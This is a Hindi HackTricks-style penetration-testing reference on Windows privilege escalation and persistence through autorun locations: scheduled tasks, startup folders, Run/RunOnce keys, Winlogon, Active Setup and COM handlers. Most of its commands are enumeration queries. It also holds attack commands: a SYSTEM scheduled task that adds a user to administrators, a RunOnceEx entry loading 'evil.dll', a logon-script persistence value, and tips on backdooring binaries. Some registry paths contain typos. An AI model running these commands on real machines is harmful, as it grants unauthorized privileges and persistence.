# Autoruns के साथ Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** का उपयोग **startup** पर प्रोग्राम चलाने के लिए किया जा सकता है। देखें कि startup पर चलने के लिए कौन-सी binaries सेट की गई हैं:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## शेड्यूल किए गए कार्य

**कार्यों** को **निश्चित आवृत्ति** पर चलने के लिए शेड्यूल किया जा सकता है। यह देखने के लिए कि कौन-से बाइनरी चलने के लिए शेड्यूल किए गए हैं, निम्नलिखित कमांड का उपयोग करें:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Requires an elevated caller to register a task as SYSTEM
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

`/sc ONLOGON /rl HIGHEST` से बनाया गया task अपने registered principal के लिए **उपलब्ध** highest run level का अनुरोध करता है; केवल यह switch principal को नहीं बदलता और न ही UAC को bypass करता है। Low-privilege process, highest-run-level task register नहीं कर सकता और न ही SYSTEM को task identity के रूप में चुन सकता है। ऊपर दिए गए उदाहरण को पहले से elevated caller की कार्रवाई मानें, standard user से SYSTEM तक पहुँचने का तरीका नहीं।<sup>[[8]](#references)</sup>

SYSTEM के रूप में चलने वाला enabled task जाँच के योग्य है, भले ही उसकी task definition और action file सुरक्षित हों। [Task Scheduler को task को on demand चलाने के लिए उस पर execute permission की आवश्यकता होती है](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)। यदि किसी low-privilege user के पास यह permission है, तो सटीक action की जाँच करें—खासकर उन PowerShell scripts की, जो Active Directory ACLs में बदलाव करती हैं या account-protection settings reset करती हैं। Task की `AllowDemandStart` setting जाँचें और script के inputs तथा effects की पुष्टि करें; केवल किसी fixed task को शुरू करने की permission से मनमाने code का execution संभव नहीं हो जाता।

## Folders

**Startup folders में मौजूद सभी binaries startup पर execute होंगे**। आम startup folders वे हैं जो आगे सूचीबद्ध हैं, लेकिन startup folder का पता registry में दिया गया है। [यहाँ पढ़ें कि वह कहाँ है।](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

किसी अधिक-विशेषाधिकार वाले उपयोगकर्ता की Startup entry किसी सुरक्षित script को लॉन्च कर सकती है, जो बार-बार ऐसी directory से files खोलती है जिसमें कोई दूसरा उपयोगकर्ता लिख सकता है। उस directory को privilege escalation का रास्ता मानने से पहले entry की **वास्तविक logon identity**, script की input directory और ACLs, तथा उसके सटीक action की जाँच करें। विशेष रूप से, [`hh.exe` compiled HTML Help (`.chm`) files खोलता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); कोई script यदि caller द्वारा दी गई files इसे देती है, तो वह content trust boundary पार करती है—भले ही वह filename या शुरुआती bytes की जाँच करे। [HTML Help policies executable shortcuts को प्रतिबंधित कर सकती हैं](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), इसलिए installed policy और उपलब्ध content के व्यवहार की पुष्टि करें। केवल `.chm` extension या magic bytes से यह साबित नहीं होता कि अधिक-विशेषाधिकार वाले code का execution होगा। Enumeration के दौरान untrusted file खोले बिना autorun, process command line और path permissions की जाँच करें।

यही content boundary तब भी मौजूद होती है, जब कोई अधिक-विशेषाधिकार वाला व्यक्ति किसी ऐसे documentation folder से `.chm` को **खुद खोलता है** जिसे कोई दूसरा उपयोगकर्ता बदल सकता है। सटीक file और parent-directory पर write rights, viewer की वास्तविक identity और file खोलने की घटना, तथा प्रभावी HTML Help policy की पुष्टि करें। Writable folder या documentation की समीक्षा करने का अनुरोध इस बात का प्रमाण नहीं है कि अधिक-विशेषाधिकार वाली identity ने attacker-controlled content खोला।

> **FYI**: Archive extraction *path traversal* vulnerabilities (जैसे WinRAR 7.13 से पहले वाली vulnerability, जिसका दुरुपयोग किया गया था – CVE-2025-8088) का उपयोग **decompression के दौरान payloads सीधे इन Startup folders में डालने** के लिए किया जा सकता है, जिससे अगले user logon पर code execution होता है। इस technique की विस्तृत जानकारी के लिए देखें:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## रजिस्ट्री

> [!TIP]
> [यहाँ से नोट](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry entry बताती है कि आप 64-bit Windows version चला रहे हैं। ऑपरेटिंग सिस्टम इस key का उपयोग 64-bit Windows versions पर चलने वाले 32-bit applications के लिए HKEY_LOCAL_MACHINE\SOFTWARE का अलग view दिखाने हेतु करता है।

### रन

**आम तौर पर ज्ञात** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** और **RunOnce** नाम से जानी जाने वाली registry keys हर बार उपयोगकर्ता के system में log in करने पर programs को स्वचालित रूप से execute करने के लिए बनाई गई हैं। Key के data value के रूप में दिया गया command line अधिकतम 260 characters का हो सकता है।<sup>[[2]](#references)</sup>

**Service runs** (boot के दौरान services के automatic startup को नियंत्रित कर सकते हैं):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista और उसके बाद के versions में, **Run** और **RunOnce** registry keys स्वचालित रूप से नहीं बनतीं। इन keys की entries programs को सीधे शुरू कर सकती हैं या उन्हें dependencies के रूप में निर्दिष्ट कर सकती हैं। उदाहरण के लिए, logon पर DLL file load करने के लिए **RunOnceEx** registry key के साथ "Depend" key का उपयोग किया जा सकता है। इसे system start-up के दौरान "C:\temp\evil.dll" execute करने वाली registry entry जोड़कर दिखाया गया है:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: यदि आप **HKLM** के अंदर बताए गए किसी भी registry में लिख सकते हैं, तो किसी दूसरे user के login करने पर आप privileges escalate कर सकते हैं।

> [!TIP]
> **Exploit 2**: यदि आप **HKLM** के अंदर किसी भी registry में बताई गई binaries को overwrite कर सकते हैं, तो किसी दूसरे user के login करने पर आप उस binary में backdoor जोड़कर privileges escalate कर सकते हैं।

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** फ़ोल्डर में रखे गए शॉर्टकट, उपयोगकर्ता के लॉगिन या सिस्टम रीबूट के दौरान सेवाओं या एप्लिकेशन को स्वचालित रूप से शुरू कर देते हैं। **Startup** फ़ोल्डर का स्थान, **Local Machine** और **Current User** दोनों स्कोप के लिए रजिस्ट्री में निर्धारित होता है। इसका अर्थ है कि इन निर्दिष्ट **Startup** स्थानों में जोड़ा गया कोई भी शॉर्टकट, लॉगिन या रीबूट प्रक्रिया के बाद उससे जुड़ी सेवा या प्रोग्राम को शुरू करना सुनिश्चित करेगा। इससे प्रोग्राम को स्वचालित रूप से चलाने का शेड्यूल बनाना आसान हो जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> अगर आप **HKLM** के अंतर्गत किसी भी \[User] Shell Folder को ओवरराइट कर सकते हैं, तो आप उसका स्थान अपने नियंत्रण वाले फ़ोल्डर पर सेट कर पाएँगे और वहाँ एक backdoor रख सकेंगे, जो किसी भी उपयोगकर्ता के सिस्टम में लॉगिन करने पर निष्पादित होगा और privileges बढ़ा देगा।

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

यह per-user registry value किसी script या command की ओर संकेत कर सकती है, जो उस user के लॉग ऑन करने पर execute होती है। यह मुख्य रूप से **persistence** primitive है, क्योंकि यह केवल प्रभावित user के context में चलती है, लेकिन post-exploitation और autoruns reviews के दौरान इसकी जाँच करना फिर भी उचित है।<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> यदि आप current user के लिए इस value को लिख सकते हैं, तो admin rights के बिना अगले interactive logon पर execution को फिर से trigger कर सकते हैं। यदि आप इसे किसी अन्य user hive के लिए लिख सकते हैं, तो उस user के लॉग ऑन करने पर code execution प्राप्त कर सकते हैं।

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Notes:

- `.bat`, `.cmd`, `.ps1` या अन्य launcher files के ऐसे full paths को प्राथमिकता दें, जिन्हें target user पहले से पढ़ सकता हो।
- यह value हटाए जाने तक logoff/reboot के बाद भी बना रहता है।
- `HKLM\...\Run` के विपरीत, यह अपने-आप elevation नहीं देता; यह user-scope persistence है।

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

आमतौर पर, **Userinit** key को **userinit.exe** पर सेट किया जाता है। हालांकि, यदि इस key को संशोधित किया जाता है, तो निर्दिष्ट executable को user के logon करने पर **Winlogon** भी लॉन्च करेगा। इसी तरह, **Shell** key का उद्देश्य **explorer.exe** की ओर संकेत करना है, जो Windows का default shell है।<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> यदि आप registry value या binary को overwrite कर सकते हैं, तो आप privileges escalate कर पाएंगे।

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key check करें।

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Safe Mode Command Prompt बदलना

Windows Registry में `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` के अंतर्गत, डिफ़ॉल्ट रूप से `cmd.exe` पर सेट किया गया **`AlternateShell`** value होता है। इसका मतलब है कि startup के दौरान "Safe Mode with Command Prompt" चुनने पर (F8 दबाकर), `cmd.exe` का उपयोग किया जाता है। लेकिन, F8 दबाकर इसे manually चुनने की ज़रूरत के बिना, कंप्यूटर को अपने-आप इस mode में start करने के लिए सेट करना संभव है।

"Safe Mode with Command Prompt" में अपने-आप start करने का boot option बनाने के चरण:<sup>[[5]](#references)</sup>

1. `boot.ini` file के attributes बदलकर read-only, system और hidden flags हटाएँ: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` को editing के लिए खोलें।
3. इस तरह की एक line जोड़ें: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` में बदलाव save करें।
5. File के मूल attributes फिर से लागू करें: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key बदलने से custom command shell सेट किया जा सकता है, जिससे unauthorized access मिल सकता है।
- **Exploit 2 (PATH Write Permissions):** System **PATH** variable के किसी भी हिस्से में, विशेषकर `C:\Windows\system32` से पहले, write permissions होने पर custom `cmd.exe` execute किया जा सकता है, जो system के Safe Mode में start होने पर backdoor हो सकता है।
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` में write access होने से अपने-आप Safe Mode startup सक्षम किया जा सकता है, जिससे अगले reboot पर unauthorized access मिल सकता है।

मौजूदा **AlternateShell** setting देखने के लिए, इन commands का उपयोग करें:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### इंस्टॉल किया गया घटक

Active Setup Windows का एक फीचर है, जो **डेस्कटॉप वातावरण पूरी तरह लोड होने से पहले शुरू होता है**। यह कुछ कमांड के निष्पादन को प्राथमिकता देता है, जिन्हें उपयोगकर्ता का लॉगऑन आगे बढ़ने से पहले पूरा होना चाहिए। यह प्रक्रिया Run या RunOnce registry sections जैसी अन्य startup entries ट्रिगर होने से भी पहले होती है।

Active Setup को इन registry keys के ज़रिए प्रबंधित किया जाता है:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

इन keys के भीतर कई subkeys होती हैं, जिनमें से हर एक किसी खास component से संबंधित होती है। इनकी कुछ खास अहम key values हैं:

- **IsInstalled:**
  - `0` का अर्थ है कि component की command निष्पादित नहीं होगी।
  - `1` का अर्थ है कि हर उपयोगकर्ता के लिए command एक बार निष्पादित होगी। `IsInstalled` value मौजूद न होने पर यही डिफ़ॉल्ट व्यवहार होता है।
- **StubPath:** Active Setup द्वारा निष्पादित की जाने वाली command निर्धारित करता है। यह कोई भी मान्य command line हो सकती है, जैसे `notepad` लॉन्च करना।

**सुरक्षा संबंधी जानकारी:**

- किसी ऐसी key को संशोधित करने या उसमें लिखने से, जिसमें **`IsInstalled`** की value `"1"` और एक खास **`StubPath`** हो, अनधिकृत command execution हो सकता है और संभावित रूप से privilege escalation भी हो सकती है।
- किसी भी **`StubPath`** value में संदर्भित binary file को बदलने से भी privilege escalation हो सकती है, बशर्ते पर्याप्त permissions हों।

Active Setup components में **`StubPath`** configurations की जाँच के लिए इन commands का उपयोग किया जा सकता है:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Browser Helper Objects (BHOs) का अवलोकन

Browser Helper Objects (BHOs) ऐसे DLL मॉड्यूल हैं जो Microsoft's Internet Explorer में अतिरिक्त सुविधाएँ जोड़ते हैं। हर बार शुरू होने पर ये Internet Explorer और Windows Explorer में लोड होते हैं। हालांकि, **NoExplorer** key को 1 पर सेट करके इनके execution को रोका जा सकता है, जिससे ये Windows Explorer instances के साथ लोड नहीं होते।<sup>[[1]](#references)</sup>

BHOs, Internet Explorer 11 के ज़रिए Windows 10 के साथ compatible हैं, लेकिन Microsoft Edge में supported नहीं हैं, जो Windows के नए versions में default browser है।

किसी system पर registered BHOs देखने के लिए, आप इन registry keys की जाँच कर सकते हैं:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Registry में हर BHO को उसके **CLSID** से दर्शाया जाता है, जो एक unique identifier के रूप में काम करता है। हर CLSID के बारे में विस्तृत जानकारी `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` के अंतर्गत मिल सकती है।

Registry में BHOs को query करने के लिए, इन commands का उपयोग किया जा सकता है:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ध्यान दें कि registry में हर dll के लिए 1 नई registry entry होगी और उसे **CLSID** से दर्शाया जाएगा। CLSID की जानकारी `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` में मिल सकती है।

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### खोलने की कमांड

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Context menu COM handlers

Explorer के context menu handlers, `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` और `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers` जैसी keys के तहत registered shell extensions होते हैं। किसी handler की default value, या कभी-कभी उसका key name, एक CLSID होता है। उस CLSID को `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32` तक follow करें; इसकी default value उस DLL का नाम बताती है जिसे handler invoke होने पर load किया जाता है।

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

32-bit और 64-bit registry views, दोनों जाँचें। `HKCR` per-user और machine-wide class registrations को मर्ज करता है, इसलिए पुष्टि करें कि कोई process किस underlying key को resolve करेगा। जिस low-privilege identity को machine-wide `InprocServer32` value बदलने की अनुमति हो, वह किसी अधिक privileged process को दूसरी DLL की ओर redirect कर सकती है, लेकिन privilege escalation के लिए उस process को handler invoke करना ज़रूरी है। Registry value सुरक्षित होने पर भी, writable DLL path से ऐसा ही जोखिम पैदा हो सकता है।

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

ध्यान दें कि autoruns खोजने वाली सभी जगहों को [ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **पहले से ही खोज चुका है**। हालांकि, auto-executed फ़ाइलों की **अधिक व्यापक सूची** के लिए आप systinternals के [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) का उपयोग कर सकते हैं:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## अधिक

**[**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) में रजिस्ट्री जैसे और Autoruns खोजें**<sup>[[4]](#references)</sup>

## References

- [1] [Malware के सामान्य persistence mechanisms](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot या Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot या Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Windows Sysinternals Tools से Troubleshooting, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Alternate shell शुरू करने वाला boot option कैसे जोड़ें?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
- [8] [Microsoft Learn – Tasks के लिए Security Contexts](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)
{{#include ../../banners/hacktricks-training.md}}
